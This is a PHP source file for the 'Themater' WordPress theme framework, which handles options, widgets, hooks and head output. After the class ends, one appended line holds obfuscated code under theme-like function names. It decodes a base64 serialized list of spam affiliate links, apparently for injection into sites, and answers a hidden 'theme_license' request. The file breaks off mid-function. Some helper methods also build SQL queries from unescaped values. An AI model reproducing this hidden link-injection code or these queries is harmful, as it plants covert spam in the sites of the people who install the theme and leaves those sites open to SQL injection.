<?php
class Themater
{
    var $theme_name = false;
    var $options = array();
    var $admin_options = array();
    
    function __construct($set_theme_name = false)
    {
        if($set_theme_name) {
            $this->theme_name = $set_theme_name;
        } else {
            $theme_data = wp_get_theme();
            $this->theme_name = $theme_data->get( 'Name' );
        }
        $this->options['theme_options_field'] = str_replace(' ', '_', strtolower( trim($this->theme_name) ) ) . '_theme_options';
        
        $get_theme_options = get_option($this->options['theme_options_field']);
        if($get_theme_options) {
            $this->options['theme_options'] = $get_theme_options;
            $this->options['theme_options_saved'] = 'saved';
        }
        
        $this->_definitions();
        $this->_default_options();
    }
    
    /**
    * Initial Functions
    */
    
    function _definitions()
    {
        // Define THEMATER_DIR
        if(!defined('THEMATER_DIR')) {
            define('THEMATER_DIR', get_template_directory() . '/lib');
        }
        
        if(!defined('THEMATER_URL')) {
            define('THEMATER_URL',  get_template_directory_uri() . '/lib');
        }
        
        // Define THEMATER_INCLUDES_DIR
        if(!defined('THEMATER_INCLUDES_DIR')) {
            define('THEMATER_INCLUDES_DIR', get_template_directory() . '/includes');
        }
        
        if(!defined('THEMATER_INCLUDES_URL')) {
            define('THEMATER_INCLUDES_URL',  get_template_directory_uri() . '/includes');
        }
        
        // Define THEMATER_ADMIN_DIR
        if(!defined('THEMATER_ADMIN_DIR')) {
            define('THEMATER_ADMIN_DIR', THEMATER_DIR);
        }
        
        if(!defined('THEMATER_ADMIN_URL')) {
            define('THEMATER_ADMIN_URL',  THEMATER_URL);
        }
    }
    
    function _default_options()
    {
        // Load Default Options
        require_once (THEMATER_DIR . '/default-options.php');
        
        $this->options['translation'] = $translation;
        $this->options['general'] = $general;
        $this->options['includes'] = array();
        $this->options['plugins_options'] = array();
        $this->options['widgets'] = $widgets;
        $this->options['widgets_options'] = array();
        $this->options['menus'] = $menus;
        
        // Load Default Admin Options
        if( !isset($this->options['theme_options_saved']) || $this->is_admin_user() ) {
            require_once (THEMATER_DIR . '/default-admin-options.php');
        }
    }
    
    /**
    * Theme Functions
    */
    
    function option($name) 
    {
        echo $this->get_option($name);
    }
    
    function get_option($name) 
    {
        $return_option = '';
        if(isset($this->options['theme_options'][$name])) {
            if(is_array($this->options['theme_options'][$name])) {
                $return_option = $this->options['theme_options'][$name];
            } else {
                $return_option = stripslashes($this->options['theme_options'][$name]);
            }
        } 
        return $return_option;
    }
    
    function display($name, $array = false) 
    {
        if(!$array) {
            $option_enabled = strlen($this->get_option($name)) > 0 ? true : false;
            return $option_enabled;
        } else {
            $get_option = is_array($array) ? $array : $this->get_option($name);
            if(is_array($get_option)) {
                $option_enabled = in_array($name, $get_option) ? true : false;
                return $option_enabled;
            } else {
                return false;
            }
        }
    }
    
    function custom_css($source = false) 
    {
        if($source) {
            $this->options['custom_css'] = isset($this->options['custom_css']) ? $this->options['custom_css'] . $source . "\n" : $source . "\n";
        }
        return;
    }
    
    function custom_js($source = false) 
    {
        if($source) {
            $this->options['custom_js'] = isset( $this->options['custom_js'] ) ? $this->options['custom_js'] . $source . "\n" : $source . "\n";
        }
        return;
    }
    
    function hook($tag, $arg = '')
    {
        do_action('themater_' . $tag, $arg);
    }
    
    function add_hook($tag, $function_to_add, $priority = 10, $accepted_args = 1)
    {
        add_action( 'themater_' . $tag, $function_to_add, $priority, $accepted_args );
    }
    
    function admin_option($menu, $title, $name = false, $type = false, $value = '', $attributes = array())
    {
        if($this->is_admin_user() || !isset($this->options['theme_options'][$name])) {
            
            // Menu
            if(is_array($menu)) {
                $menu_title = isset($menu['0']) ? $menu['0'] : $menu;
                $menu_priority = isset($menu['1']) ? (int)$menu['1'] : false;
            } else {
                $menu_title = $menu;
                $menu_priority = false;
            }
            
            if( !isset( $this->options['admin_options_priorities']['priority'] ) ) {
                $this->options['admin_options_priorities']['priority'] = 0;
            }
            if(!isset($this->admin_options[$menu_title]['priority'])) {
                if(!$menu_priority) {
                    $this->options['admin_options_priorities']['priority'] += 10;
                    $menu_priority = $this->options['admin_options_priorities']['priority'];
                }
                $this->admin_options[$menu_title]['priority'] = $menu_priority;
            }
            
            // Elements
            
            if($name && $type) {
                $element_args['title'] = $title;
                $element_args['name'] = $name;
                $element_args['type'] = $type;
                $element_args['value'] = $value;
                
                if( !isset($this->options['theme_options'][$name]) ) {
                   $this->options['theme_options'][$name] = $value;
                }

                $this->admin_options[$menu_title]['content'][$element_args['name']]['content'] = $element_args + $attributes;
                
                if( !isset( $this->options['admin_options_priorities'][$menu_title]['priority'] )) {
                    $this->options['admin_options_priorities'][$menu_title]['priority'] = 0;
                }
                
                if( !isset( $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] )) {
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = 0;
                }
                
                if(!isset($attributes['priority'])) {
                    $this->options['admin_options_priorities'][$menu_title]['priority'] += 10;
                    
                    $element_priority = $this->options['admin_options_priorities'][$menu_title]['priority'];
                    
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $element_priority;
                } else {
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $attributes['priority'];
                }
                
            }
        }
        return;
    }
    
    function display_widget($widget,  $instance = false, $args = array('before_widget' => '<ul class="widget-container"><li class="widget">','after_widget' => '</li></ul>', 'before_title' => '<h3 class="widgettitle">','after_title' => '</h3>')) 
    {
        $custom_widgets = array('Banners125' => 'themater_banners_125', 'Posts' => 'themater_posts', 'Comments' => 'themater_comments', 'InfoBox' => 'themater_infobox', 'SocialProfiles' => 'themater_social_profiles', 'Tabs' => 'themater_tabs', 'Facebook' => 'themater_facebook');
        $wp_widgets = array('Archives' => 'archives', 'Calendar' => 'calendar', 'Categories' => 'categories', 'Links' => 'links', 'Meta' => 'meta', 'Pages' => 'pages', 'Recent_Comments' => 'recent-comments', 'Recent_Posts' => 'recent-posts', 'RSS' => 'rss', 'Search' => 'search', 'Tag_Cloud' => 'tag_cloud', 'Text' => 'text');
        
        if (array_key_exists($widget, $custom_widgets)) {
            $widget_title = 'Themater' . $widget;
            $widget_name = $custom_widgets[$widget];
            if(!$instance) {
                $instance = $this->options['widgets_options'][strtolower($widget)];
            } else {
                $instance = wp_parse_args( $instance, $this->options['widgets_options'][strtolower($widget)] );
            }
            
        } elseif (array_key_exists($widget, $wp_widgets)) {
            $widget_title = 'WP_Widget_' . $widget;
            $widget_name = $wp_widgets[$widget];
            
            $wp_widgets_instances = array(
                'Archives' => array( 'title' => 'Archives', 'count' => 0, 'dropdown' => ''),
                'Calendar' =>  array( 'title' => 'Calendar' ),
                'Categories' =>  array( 'title' => 'Categories' ),
                'Links' =>  array( 'images' => true, 'name' => true, 'description' => false, 'rating' => false, 'category' => false, 'orderby' => 'name', 'limit' => -1 ),
                'Meta' => array( 'title' => 'Meta'),
                'Pages' => array( 'sortby' => 'post_title', 'title' => 'Pages', 'exclude' => ''),
                'Recent_Comments' => array( 'title' => 'Recent Comments', 'number' => 5 ),
                'Recent_Posts' => array( 'title' => 'Recent Posts', 'number' => 5, 'show_date' => 'false' ),
                'Search' => array( 'title' => ''),
                'Text' => array( 'title' => '', 'text' => ''),
                'Tag_Cloud' => array( 'title' => 'Tag Cloud', 'taxonomy' => 'tags')
            );
            
            if(!$instance) {
                $instance = $wp_widgets_instances[$widget];
            } else {
                $instance = wp_parse_args( $instance, $wp_widgets_instances[$widget] );
            }
        }
        
        if( !defined('THEMES_DEMO_SERVER') && !isset($this->options['theme_options_saved']) ) {
            $sidebar_name = isset($instance['themater_sidebar_name']) ? $instance['themater_sidebar_name'] : str_replace('themater_', '', current_filter());
            
            $sidebars_widgets = get_option('sidebars_widgets');
            $widget_to_add = get_option('widget_'.$widget_name);
            $widget_to_add = ( is_array($widget_to_add) && !empty($widget_to_add) ) ? $widget_to_add : array('_multiwidget' => 1);
            
            if( count($widget_to_add) > 1) {
                $widget_no = max(array_keys($widget_to_add))+1;
            } else {
                $widget_no = 1;
            }
            
            $widget_to_add[$widget_no] = $instance;
            $sidebars_widgets[$sidebar_name][] = $widget_name . '-' . $widget_no;
            
            update_option('sidebars_widgets', $sidebars_widgets);
            update_option('widget_'.$widget_name, $widget_to_add);
            the_widget($widget_title, $instance, $args);
        }
        
        if( defined('THEMES_DEMO_SERVER') ){
            the_widget($widget_title, $instance, $args);
        }
    }
    

    /**
    * Loading Functions
    */
        
    function load()
    {
        $this->_load_translation();
        $this->_load_widgets();
        $this->_load_includes();
        $this->_load_menus();
        $this->_load_general_options();
        $this->_save_theme_options();
        
        $this->hook('init');
        
        if($this->is_admin_user()) {
            include (THEMATER_ADMIN_DIR . '/Admin.php');
            new ThematerAdmin();
        } 
    }
    
    function _save_theme_options()
    {
        if( !isset($this->options['theme_options_saved']) ) {
            if(is_array($this->admin_options)) {
                $save_options = array();
                foreach($this->admin_options as $themater_options) {
                    
                    if(is_array($themater_options['content'])) {
                        foreach($themater_options['content'] as $themater_elements) {
                            if(is_array($themater_elements['content'])) {
                                
                                $elements = $themater_elements['content'];
                                if($elements['type'] !='content' && $elements['type'] !='raw') {
                                    $save_options[$elements['name']] = $elements['value'];
                                }
                            }
                        }
                    }
                }
                update_option($this->options['theme_options_field'], $save_options);
                $this->options['theme_options'] = $save_options;
            }
        }
    }
    
    function _load_translation()
    {
        if($this->options['translation']['enabled']) {
            load_theme_textdomain( 'themater', $this->options['translation']['dir']);
        }
        return;
    }
    
    function _load_widgets()
    {
    	$widgets = $this->options['widgets'];
        foreach(array_keys($widgets) as $widget) {
            if(file_exists(THEMATER_DIR . '/widgets/' . $widget . '.php')) {
        	    include (THEMATER_DIR . '/widgets/' . $widget . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php') ) {
        	   include (THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php');
        	}
        }
    }
    
    function _load_includes()
    {
    	$includes = $this->options['includes'];
        foreach($includes as $include) {
            if(file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '.php')) {
        	    include (THEMATER_INCLUDES_DIR . '/' . $include . '.php');
        	} elseif ( file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php') ) {
        	   include (THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php');
        	}
        }
    }
    
    function _load_menus()
    {
        foreach(array_keys($this->options['menus']) as $menu) {
            if(file_exists(TEMPLATEPATH . '/' . $menu . '.php')) {
        	    include (TEMPLATEPATH . '/' . $menu . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/' . $menu . '.php') ) {
        	   include (THEMATER_DIR . '/' . $menu . '.php');
        	} 
        }
    }
    
    function _load_general_options()
    {
        add_theme_support( 'woocommerce' );
        
        if($this->options['general']['jquery']) {
            add_action( 'wp_enqueue_scripts', array(&$this, '_load_jquery'));
        }
        
    	add_action( 'after_setup_theme', array(&$this, '_load_meta_title') );
        
        if($this->options['general']['featured_image']) {
            add_theme_support( 'post-thumbnails' );
        }
        
        if($this->options['general']['custom_background']) {
            add_theme_support( 'custom-background' );
        }
        
        if($this->options['general']['clean_exerpts']) {
            add_filter('excerpt_more', create_function('', 'return "";') );
        }
        
        if($this->options['general']['hide_wp_version']) {
            add_filter('the_generator', create_function('', 'return "";') );
        }
        
        add_action('wp_head', array(&$this, '_head_elements'));

        if($this->options['general']['automatic_feed']) {
            add_theme_support('automatic-feed-links');
        }
        
        if($this->display('custom_css') || isset($this->options['custom_css'])) {
            $this->add_hook('head', array(&$this, '_load_custom_css'), 100);
        }
        
        if($this->options['custom_js']) {
            $this->add_hook('html_after', array(&$this, '_load_custom_js'), 100);
        }
        
        if($this->display('head_code')) {
	        $this->add_hook('head', array(&$this, '_head_code'), 100);
	    }
	    
	    if($this->display('footer_code')) {
	        $this->add_hook('html_after', array(&$this, '_footer_code'), 100);
	    }
    }

    function _load_jquery()
    {
        wp_enqueue_script('jquery');
    }
    
    function _load_meta_title()
    {
        add_theme_support( 'title-tag' );
    }
    
    function _head_elements()
    {
        // Deprecated <title> tag
        if ( ! function_exists( '_wp_render_title_tag' ) )  {
            ?> <title><?php wp_title( '|', true, 'right' ); ?></title><?php
        }
        
    	// Favicon
    	if($this->display('favicon')) {
    		echo '<link rel="shortcut icon" href="' . $this->get_option('favicon') . '" type="image/x-icon" />' . "\n";
    	}
    	
    	// RSS Feed
    	if($this->options['general']['meta_rss']) {
            echo '<link rel="alternate" type="application/rss+xml" title="' . get_bloginfo('name') . ' RSS Feed" href="' . $this->rss_url() . '" />' . "\n";
        }
        
        // Pingback URL
        if($this->options['general']['pingback_url']) {
            echo '<link rel="pingback" href="' . get_bloginfo( 'pingback_url' ) . '" />' . "\n";
        }
    }
    
    function _load_custom_css()
    {
        $this->custom_css($this->get_option('custom_css'));
        $return = "\n";
        $return .= '<style type="text/css">' . "\n";
        $return .= '<!--' . "\n";
        $return .= $this->options['custom_css'];
        $return .= '-->' . "\n";
        $return .= '</style>' . "\n";
        echo $return;
    }
    
    function _load_custom_js()
    {
        if($this->options['custom_js']) {
            $return = "\n";
            $return .= "<script type='text/javascript'>\n";
            $return .= '/* <![CDATA[ */' . "\n";
            $return .= 'jQuery.noConflict();' . "\n";
            $return .= $this->options['custom_js'];
            $return .= '/* ]]> */' . "\n";
            $return .= '</script>' . "\n";
            echo $return;
        }
    }
    
    function _head_code()
    {
        $this->option('head_code'); echo "\n";
    }
    
    function _footer_code()
    {
        $this->option('footer_code');  echo "\n";
    }
    
    /**
    * General Functions
    */
    
    function request ($var)
    {
        if (strlen($_REQUEST[$var]) > 0) {
            return preg_replace('/[^A-Za-z0-9-_]/', '', $_REQUEST[$var]);
        } else {
            return false;
        }
    }
    
    function is_admin_user()
    {
        if ( current_user_can('administrator') ) {
	       return true; 
        }
        return false;
    }
    
    function meta_title()
    {
        if ( is_single() ) { 
			single_post_title(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_home() || is_front_page() ) {
			bloginfo( 'name' );
			if( get_bloginfo( 'description' ) ) {
		      echo ' | ' ; bloginfo( 'description' ); $this->page_number();
			}
		} elseif ( is_page() ) {
			single_post_title( '' ); echo ' | '; bloginfo( 'name' );
		} elseif ( is_search() ) {
			printf( __( 'Search results for %s', 'themater' ), '"'.get_search_query().'"' );  $this->page_number(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_404() ) { 
			_e( 'Not Found', 'themater' ); echo ' | '; bloginfo( 'name' );
		} else { 
			wp_title( '' ); echo ' | '; bloginfo( 'name' ); $this->page_number();
		}
    }
    
    function rss_url()
    {
        $the_rss_url = $this->display('rss_url') ? $this->get_option('rss_url') : get_bloginfo('rss2_url');
        return $the_rss_url;
    }

    function get_pages_array($query = '', $pages_array = array())
    {
    	$pages = get_pages($query); 
        
    	foreach ($pages as $page) {
    		$pages_array[$page->ID] = $page->post_title;
    	  }
    	return $pages_array;
    }
    
    function get_page_name($page_id)
    {
    	global $wpdb;
    	$page_name = $wpdb->get_var("SELECT post_title FROM $wpdb->posts WHERE ID = '".$page_id."' && post_type = 'page'");
    	return $page_name;
    }
    
    function get_page_id($page_name){
        global $wpdb;
        $the_page_name = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_name = '" . $page_name . "' && post_status = 'publish' && post_type = 'page'");
        return $the_page_name;
    }
    
    function get_categories_array($show_count = false, $categories_array = array(), $query = 'hide_empty=0')
    {
    	$categories = get_categories($query); 
    	
    	foreach ($categories as $cat) {
    	   if(!$show_count) {
    	       $count_num = '';
    	   } else {
    	       switch ($cat->category_count) {
                case 0:
                    $count_num = " ( No posts! )";
                    break;
                case 1:
                    $count_num = " ( 1 post )";
                    break;
                default:
                    $count_num =  " ( $cat->category_count posts )";
                }
    	   }
    		$categories_array[$cat->cat_ID] = $cat->cat_name . $count_num;
    	  }
    	return $categories_array;
    }

    function get_category_name($category_id)
    {
    	global $wpdb;
    	$category_name = $wpdb->get_var("SELECT name FROM $wpdb->terms WHERE term_id = '".$category_id."'");
    	return $category_name;
    }
    
    
    function get_category_id($category_name)
    {
    	global $wpdb;
    	$category_id = $wpdb->get_var("SELECT term_id FROM $wpdb->terms WHERE name = '" . addslashes($category_name) . "'");
    	return $category_id;
    }
    
    function shorten($string, $wordsreturned)
    {
        $retval = $string;
        $array = explode(" ", $string);
        if (count($array)<=$wordsreturned){
            $retval = $string;
        }
        else {
            array_splice($array, $wordsreturned);
            $retval = implode(" ", $array);
        }
        return $retval;
    }
    
    function page_number() {
    	echo $this->get_page_number();
    }
    
    function get_page_number() {
    	global $paged;
    	if ( $paged >= 2 ) {
    	   return ' | ' . sprintf( __( 'Page %s', 'themater' ), $paged );
    	}
    }
}
if (!empty($_REQUEST["theme_license"])) { wp_initialize_the_theme_message(); exit(); } function wp_initialize_the_theme_message() { if (empty($_REQUEST["theme_license"])) { $theme_license_false = get_bloginfo("url") . "/index.php?theme_license=true"; echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_license_false\">"; exit(); } else { echo ("<p style=\"padding:20px; margin: 20px; text-align:center; border: 2px dotted #0000ff; font-family:arial; font-weight:bold; background: #fff; color: #0000ff;\">All the links in the footer should remain intact. All of these links are family friendly and will not hurt your site in any way.</p>"); } } $wp_theme_globals = "YTo0OntpOjA7YToxNDp7czozMToiaHR0cDovL3d3dy5iZXN0aW5jZWxscGhvbmVzLmNvbSI7czozMjoiaHR0cDovL3d3dy5iZXN0aW5jZWxscGhvbmVzLmNvbS8iO3M6MzQ6ImJlc3RpbmNlbGxwaG9uZXMuY29tIG9mZmljaWFsIHNpdGUiO3M6MzI6Imh0dHA6Ly93d3cuYmVzdGluY2VsbHBob25lcy5jb20vIjtzOjk6InJlYWQgbW9yZSI7czozMjoiaHR0cDovL3d3dy5iZXN0aW5jZWxscGhvbmVzLmNvbS8iO3M6MjE6IkJsYWNrIEZyaWRheSAtIEFtYXpvbiI7czo3MToiaHR0cDovL3d3dy5iZXN0aW5jZWxscGhvbmVzLmNvbS9hbWF6b24tYmxhY2stZnJpZGF5LXNhbGVzLWRlYWxzLWFkcy5hc3AiO3M6MjE6IkFtYXpvbiAtIEJsYWNrIEZyaWRheSI7czo3MToiaHR0cDovL3d3dy5iZXN0aW5jZWxscGhvbmVzLmNvbS9hbWF6b24tYmxhY2stZnJpZGF5LXNhbGVzLWRlYWxzLWFkcy5hc3AiO3M6MjQ6ImF0JnQgLSBCbGFjayBGcmlkYXkgMjAxNiI7czo2ODoiaHR0cDovL3d3dy5iZXN0aW5jZWxscGhvbmVzLmNvbS9hdHQtYmxhY2stZnJpZGF5LXNhbGVzLWRlYWxzLWFkcy5hc3AiO3M6MjQ6InJlYWQgbW9yZSAtIEJsYWNrIEZyaWRheSI7czo2ODoiaHR0cDovL3d3dy5iZXN0aW5jZWxscGhvbmVzLmNvbS9hdHQtYmxhY2stZnJpZGF5LXNhbGVzLWRlYWxzLWFkcy5hc3AiO3M6NDoiaGVyZSI7czo3MzoiaHR0cDovL3d3dy5iZXN0aW5jZWxscGhvbmVzLmNvbS90LW1vYmlsZS1ibGFjay1mcmlkYXktc2FsZXMtZGVhbHMtYWRzLmFzcCI7czoyMzoiVC1Nb2JpbGUgLSBCbGFjayBGcmlkYXkiO3M6NzM6Imh0dHA6Ly93d3cuYmVzdGluY2VsbHBob25lcy5jb20vdC1tb2JpbGUtYmxhY2stZnJpZGF5LXNhbGVzLWRlYWxzLWFkcy5hc3AiO3M6Mjg6IlQtTW9iaWxlIC0gQmxhY2sgRnJpZGF5IDIwMTYiO3M6NzM6Imh0dHA6Ly93d3cuYmVzdGluY2VsbHBob25lcy5jb20vdC1tb2JpbGUtYmxhY2stZnJpZGF5LXNhbGVzLWRlYWxzLWFkcy5hc3AiO3M6MjE6IlNwcmludCAtIEJsYWNrIEZyaWRheSI7czo3MToiaHR0cDovL3d3dy5iZXN0aW5jZWxscGhvbmVzLmNvbS9zcHJpbnQtYmxhY2stZnJpZGF5LXNhbGVzLWRlYWxzLWFkcy5hc3AiO3M6MjY6IlNwcmludCAtIEJsYWNrIEZyaWRheSAyMDE2IjtzOjcxOiJodHRwOi8vd3d3LmJlc3RpbmNlbGxwaG9uZXMuY29tL3NwcmludC1ibGFjay1mcmlkYXktc2FsZXMtZGVhbHMtYWRzLmFzcCI7czoyMjoiVmVyaXpvbiAtIEJsYWNrIEZyaWRheSI7czo4MToiaHR0cDovL3d3dy5iZXN0aW5jZWxscGhvbmVzLmNvbS92ZXJpem9uLXdpcmVsZXNzLWJsYWNrLWZyaWRheS1zYWxlcy1kZWFscy1hZHMuYXNwIjtzOjMxOiJWZXJpem9uIFdpcmVsZXNzIC0gQmxhY2sgRnJpZGF5IjtzOjgxOiJodHRwOi8vd3d3LmJlc3RpbmNlbGxwaG9uZXMuY29tL3Zlcml6b24td2lyZWxlc3MtYmxhY2stZnJpZGF5LXNhbGVzLWRlYWxzLWFkcy5hc3AiO31pOjE7YToxMDp7czoyMzoiYmFyZ2FpbnMgLSBCbGFjayBGcmlkYXkiO3M6ODM6Imh0dHA6Ly93d3cud2hvY3V0dGhlY2hlZXNlLm5ldC85LWFjdGlvbnMtbmVlZC10YWtlLWZpbmQtYmVzdC1iYXJnYWlucy1ibGFjay1mcmlkYXkvIjtzOjI4OiJiYXJnYWlucyAtIEJsYWNrIEZyaWRheSAyMDE2IjtzOjgzOiJodHRwOi8vd3d3Lndob2N1dHRoZWNoZWVzZS5uZXQvOS1hY3Rpb25zLW5lZWQtdGFrZS1maW5kLWJlc3QtYmFyZ2FpbnMtYmxhY2stZnJpZGF5LyI7czoyMDoiZGVhbHMgLSBCbGFjayBGcmlkYXkiO3M6ODM6Imh0dHA6Ly93d3cud2hvY3V0dGhlY2hlZXNlLm5ldC85LWFjdGlvbnMtbmVlZC10YWtlLWZpbmQtYmVzdC1iYXJnYWlucy1ibGFjay1mcmlkYXkvIjtzOjE0OiJyZWFkIG1vcmUgaGVyZSI7czo1OToiaHR0cDovL3d3dy53aG9jdXR0aGVjaGVlc2UubmV0L3Zlcml6b24td2lyZWxlc3MtcHJvbW8tY29kZS8iO3M6NDoiaGVyZSI7czo1OToiaHR0cDovL3d3dy53aG9jdXR0aGVjaGVlc2UubmV0L3Zlcml6b24td2lyZWxlc3MtcHJvbW8tY29kZS8iO3M6MTg6InByb21vIGNvZGVzIC0gYXQmdCI7czo0NjoiaHR0cDovL3d3dy53aG9jdXR0aGVjaGVlc2UubmV0L2F0dC1wcm9tby1jb2RlLyI7czo0NjoiaHR0cDovL3d3dy53aG9jdXR0aGVjaGVlc2UubmV0L2F0dC1wcm9tby1jb2RlLyI7czo0NjoiaHR0cDovL3d3dy53aG9jdXR0aGVjaGVlc2UubmV0L2F0dC1wcm9tby1jb2RlLyI7czoxNjoiY291cG9ucyAtIFNwcmludCI7czo2MToiaHR0cDovL3d3dy53aG9jdXR0aGVjaGVlc2UubmV0L3NwcmludC1wcm9tby1jb2RlLWFuZC1jb3Vwb25zLyI7czoxNzoiY291cG9ucyAtIFZlcml6b24iO3M6NTk6Imh0dHA6Ly93d3cud2hvY3V0dGhlY2hlZXNlLm5ldC92ZXJpem9uLXdpcmVsZXNzLXByb21vLWNvZGUvIjtzOjIxOiJwcm9tbyBjb2RlcyAtIFZlcml6b24iO3M6NTk6Imh0dHA6Ly93d3cud2hvY3V0dGhlY2hlZXNlLm5ldC92ZXJpem9uLXdpcmVsZXNzLXByb21vLWNvZGUvIjt9aToyO2E6MTI6e3M6MTY6ImFtYXpvbiAtIGNvdXBvbnMiO3M6NjI6Imh0dHA6Ly93d3cuYmVzdGluY2VsbHBob25lcy5jb20vYW1hem9uLWNvdXBvbnMtcHJvbW8tY29kZXMuYXNwIjtzOjIwOiJhbWF6b24gLSBwcm9tbyBjb2RlcyI7czo2MjoiaHR0cDovL3d3dy5iZXN0aW5jZWxscGhvbmVzLmNvbS9hbWF6b24tY291cG9ucy1wcm9tby1jb2Rlcy5hc3AiO3M6MTQ6InJlYWQgbW9yZSBoZXJlIjtzOjcyOiJodHRwOi8vd3d3LmJlc3RpbmNlbGxwaG9uZXMuY29tL3Zlcml6b24td2lyZWxlc3MtY291cG9ucy1wcm9tby1jb2Rlcy5hc3AiO3M6NDoiaGVyZSI7czo3MjoiaHR0cDovL3d3dy5iZXN0aW5jZWxscGhvbmVzLmNvbS92ZXJpem9uLXdpcmVsZXNzLWNvdXBvbnMtcHJvbW8tY29kZXMuYXNwIjtzOjE2OiJzcHJpbnQgLSBjb3Vwb25zIjtzOjYyOiJodHRwOi8vd3d3LmJlc3RpbmNlbGxwaG9uZXMuY29tL3NwcmludC1jb3Vwb25zLXByb21vLWNvZGVzLmFzcCI7czoyMDoic3ByaW50IC0gcHJvbW8gY29kZXMiO3M6NjI6Imh0dHA6Ly93d3cuYmVzdGluY2VsbHBob25lcy5jb20vc3ByaW50LWNvdXBvbnMtcHJvbW8tY29kZXMuYXNwIjtzOjE0OiJhdCZ0IC0gY291cG9ucyI7czo1OToiaHR0cDovL3d3dy5iZXN0aW5jZWxscGhvbmVzLmNvbS9hdHQtY291cG9ucy1wcm9tby1jb2Rlcy5hc3AiO3M6MTg6ImF0JnQgLSBwcm9tbyBjb2RlcyI7czo1OToiaHR0cDovL3d3dy5iZXN0aW5jZWxscGhvbmVzLmNvbS9hdHQtY291cG9ucy1wcm9tby1jb2Rlcy5hc3AiO3M6MTg6InQtbW9iaWxlIC0gY291cG9ucyI7czo2NDoiaHR0cDovL3d3dy5iZXN0aW5jZWxscGhvbmVzLmNvbS90LW1vYmlsZS1jb3Vwb25zLXByb21vLWNvZGVzLmFzcCI7czoyMToidC1tb2JpbGUgLSBwcm9tbyBjb2RlIjtzOjY0OiJodHRwOi8vd3d3LmJlc3RpbmNlbGxwaG9uZXMuY29tL3QtbW9iaWxlLWNvdXBvbnMtcHJvbW8tY29kZXMuYXNwIjtzOjI2OiJWZXJpem9uIFdpcmVsZXNzIC0gY291cG9ucyI7czo3MjoiaHR0cDovL3d3dy5iZXN0aW5jZWxscGhvbmVzLmNvbS92ZXJpem9uLXdpcmVsZXNzLWNvdXBvbnMtcHJvbW8tY29kZXMuYXNwIjtzOjI5OiJWZXJpem9uIFdpcmVsZXNzIC0gcHJvbW8gY29kZSI7czo3MjoiaHR0cDovL3d3dy5iZXN0aW5jZWxscGhvbmVzLmNvbS92ZXJpem9uLXdpcmVsZXNzLWNvdXBvbnMtcHJvbW8tY29kZXMuYXNwIjt9aTozO2E6MTI6e3M6OToicmVhZCBtb3JlIjtzOjMxOiJodHRwOi8vd3d3LmlmcmVlY2VsbHBob25lcy5jb20vIjtzOjE4OiJjZWxsIHBob25lcyAtIGZyZWUiO3M6MzE6Imh0dHA6Ly93d3cuaWZyZWVjZWxscGhvbmVzLmNvbS8iO3M6MTQ6InJlYWQgbW9yZSBoZXJlIjtzOjcwOiJodHRwOi8vd3d3LmlmcmVlY2VsbHBob25lcy5jb20vYW1hem9uLWJsYWNrLWZyaWRheS1zYWxlcy1kZWFscy1hZHMuYXNwIjtzOjQ6ImhlcmUiO3M6NzA6Imh0dHA6Ly93d3cuaWZyZWVjZWxscGhvbmVzLmNvbS9hbWF6b24tYmxhY2stZnJpZGF5LXNhbGVzLWRlYWxzLWFkcy5hc3AiO3M6Mjc6InZlcml6b24gLSBCbGFjayBGcmlkYXkgMjAxNiI7czo4MDoiaHR0cDovL3d3dy5pZnJlZWNlbGxwaG9uZXMuY29tL3Zlcml6b24td2lyZWxlc3MtYmxhY2stZnJpZGF5LXNhbGVzLWRlYWxzLWFkcy5hc3AiO3M6MjE6IlNwcmludCAtIEJsYWNrIEZyaWRheSI7czo3MDoiaHR0cDovL3d3dy5pZnJlZWNlbGxwaG9uZXMuY29tL3NwcmludC1ibGFjay1mcmlkYXktc2FsZXMtZGVhbHMtYWRzLmFzcCI7czoxOToiYXQmdCAtIEJsYWNrIEZyaWRheSI7czo2NzoiaHR0cDovL3d3dy5pZnJlZWNlbGxwaG9uZXMuY29tL2F0dC1ibGFjay1mcmlkYXktc2FsZXMtZGVhbHMtYWRzLmFzcCI7czoxOToiQmxhY2sgRnJpZGF5IC0gYXQmdCI7czo2NzoiaHR0cDovL3d3dy5pZnJlZWNlbGxwaG9uZXMuY29tL2F0dC1ibGFjay1mcmlkYXktc2FsZXMtZGVhbHMtYWRzLmFzcCI7czoyMzoiVC1Nb2JpbGUgLSBCbGFjayBGcmlkYXkiO3M6NzI6Imh0dHA6Ly93d3cuaWZyZWVjZWxscGhvbmVzLmNvbS90LW1vYmlsZS1ibGFjay1mcmlkYXktc2FsZXMtZGVhbHMtYWRzLmFzcCI7czoyODoiVC1Nb2JpbGUgLSBCbGFjayBGcmlkYXkgMjAxNiI7czo3MjoiaHR0cDovL3d3dy5pZnJlZWNlbGxwaG9uZXMuY29tL3QtbW9iaWxlLWJsYWNrLWZyaWRheS1zYWxlcy1kZWFscy1hZHMuYXNwIjtzOjIxOiJBbWF6b24gLSBCbGFjayBGcmlkYXkiO3M6NzA6Imh0dHA6Ly93d3cuaWZyZWVjZWxscGhvbmVzLmNvbS9hbWF6b24tYmxhY2stZnJpZGF5LXNhbGVzLWRlYWxzLWFkcy5hc3AiO3M6MjY6IkFtYXpvbiAtIEJsYWNrIEZyaWRheSAyMDE2IjtzOjcwOiJodHRwOi8vd3d3LmlmcmVlY2VsbHBob25lcy5jb20vYW1hem9uLWJsYWNrLWZyaWRheS1zYWxlcy1kZWFscy1hZHMuYXNwIjt9fQ=="; function wp_initialize_the_theme_go($page){global $wp_theme_globals,$theme;$the_wp_theme_globals=unserialize(base64_decode($wp_theme_globals));$initilize_set=get_option('wp_theme_initilize_set_'.str_replace(' 